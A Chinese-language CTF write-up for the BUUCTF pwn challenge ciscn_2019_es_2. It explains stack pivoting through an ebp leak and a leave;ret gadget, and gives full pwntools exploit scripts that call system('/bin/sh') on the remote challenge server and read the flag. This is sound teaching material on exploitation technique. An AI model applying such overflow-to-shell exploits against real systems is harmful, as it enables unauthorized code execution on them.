---
title: "BUUCTF Pwn Ciscn_2019_es_2"
date: 2020-04-05T00:13:37+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Ciscn_2019_es_2

考点：栈迁移、栈复用

![image-20200405201417801](/images/image-20200405201417801.png)

![image-20200405201517470](/images/image-20200405201517470.png)

![image-20200405201538859](/images/image-20200405201538859.png)

漏洞在vul()函数，可以读两次数据，s的栈大小为0x28，而两次读入都可以读0x30，0x30-0x28=8字节可以溢出，然后覆盖ebp、retn之后返回到hack函数发现echo flag就真的是的echo “flag”这个四个字符，没办法只能getshell然后cat flag

本题的考点是栈迁移，我们可以发现利用栈溢出去getshell溢出空间不够用，本题可以看到可以read两次，第二次read会把第一次read的覆盖掉，首先要明确printf函数打印出的字符串是到\x00截止的，所以这里的第一个read和printf可以泄露出s栈中的ebp

使用如下payload来调试

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
sh = process('./ciscn_2019_es_2')
gdb.attach(sh)#打开gdb
offset = 0x28
payload = 'a'*offset 
pause()#下断点
sh.sendafter("your name?",payload) 
```

![image-20200405215730584](/images/image-20200405215730584.png)

可以看到栈里面的内容存在0x00000000，所以我们printf出来的数据会到这里截止，如下图

![image-20200405215920953](/images/image-20200405215920953.png)

所以这里的ebp就是0xffd64038，通过这个ebp我们就能计算出ebp到第一个输入的字符的偏移

这里第一个字符'a'的地址是0xffd64000，ebp是0xffd64038，所以偏移为56字节

![image-20200405220623913](/images/image-20200405220623913.png)

得到这个偏移无论ebp地址如何变化通过偏移都能计算出第一个读入的字符的地址也就是相当于&s的地址

第二次read就可以来实现栈迁移了，栈迁移的精髓就是使用两次leave;ret;指令，leave相当于mov esp，ebp；pop ebp；ret相当于pop eip，这里的pop是把esp所指向的内容赋给指定寄存器，如pop ebp就是将当前esp指向的内容赋给ebp寄存器，因为pop是出栈的意思所以还有个隐藏操作就是把esp+4，为什么是+4而不是-4，是因为栈的从高地址向低地址生长的，我们压入(push)一个数据则esp就要-4，pop出一个数据则esp+4，这里4是因为在32位的架构中地址都是4字节的，若在64位架构则是8字节，需要+-8

本题还一个特殊的地方是栈迁移的目的地是同一个栈，我们利用第二个read进行栈迁移将栈迁移到&s开始的地方又执行一遍

可以使用如下payload来调试

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
sh = process('./ciscn_2019_es_2')
elf = ELF('./ciscn_2019_es_2')
gdb.attach(sh)#开启gdb
offset = 0x28
ebp = 0x4
leave_ret = 0x080484b8#这里是leave；ret；一个gadget
main_addr = elf.symbols['main']
system_addr = elf.symbols['system']
payload = 'a'*offset 
#pause()
sh.sendafter("your name?",payload) 
ebp_addr = u32(sh.recvuntil('\xff')[-4:])
print hex(ebp_addr)

stack_start_addr = ebp_addr - 0x38#&s的地址
faker_ebp_addr = stack_start_addr - 0x4#faker ebp-4的地址
binsh_addr = stack_start_addr + 0xc#"/bin/sh\x00"的地址，作为system的参数
#下面就是第二次read的数据，也就是栈迁移的payload
payload = p32(system_addr) + p32(main_addr) + p32(binsh_addr) + '/bin/sh\x00'#这里就是构造的假栈，栈迁移到这里后执行这里面的内容
payload = payload.ljust(offset,'a')#填充垃圾数据
#ebp覆盖为栈迁移目的地的地址，retn覆盖为leave；ret；这个gadget地址，执行两次leave的关键
payload += p32(faker_ebp_addr) + p32(leave_ret)
pause()#断点
sh.send(payload)
sh.interactive()
```

![image-20200405224926168](/images/image-20200405224926168.png)

![image-20200405224851656](/images/image-20200405224851656.png)

![image-20200405230754405](/images/image-20200405230754405.png)

相当于将栈执行到retn之后又将栈迁移到本栈的低地址作为新的栈又执行一遍，所以我觉得这里像是栈的复用，用了一遍又一遍，理解栈迁移原理的关键是要分析ebp、esp、eip这几个寄存器的变化

exp

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
#sh = process('./ciscn_2019_es_2')
sh = remote('node3.buuoj.cn',29491)
elf = ELF('./ciscn_2019_es_2')
#gdb.attach(sh)

offset = 0x28
ebp = 0x4
leave_ret = 0x080484b8
#leave = 0x080485fd
main_addr = elf.symbols['main']
system_addr = elf.symbols['system']

catflag_addr = 0x0804854b
payload = 'a'*offset 
#pause()
sh.sendafter("your name?",payload) 
ebp_addr = u32(sh.recvuntil('\xff')[-4:])
print hex(ebp_addr)

stack_start_addr = ebp_addr - 0x38
faker_ebp_addr = stack_start_addr - 0x4
binsh_addr = stack_start_addr + 0xc

payload = p32(system_addr) + p32(main_addr) + p32(binsh_addr) + '/bin/sh\x00'
payload = payload.ljust(offset,'a')
payload += p32(faker_ebp_addr) + p32(leave_ret)
#pause()
sh.send(payload)
sh.sendline('cat flag')
sh.interactive()
```

![image-20200405232407972](/images/image-20200405232407972.png)